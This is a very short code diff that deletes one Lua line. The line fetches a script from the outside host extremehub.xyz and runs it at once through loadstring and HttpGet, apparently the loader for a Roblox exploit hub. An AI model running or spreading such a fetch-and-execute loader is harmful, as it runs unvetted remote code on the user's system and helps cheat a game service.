@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://extremehub.xyz/script/", true))()
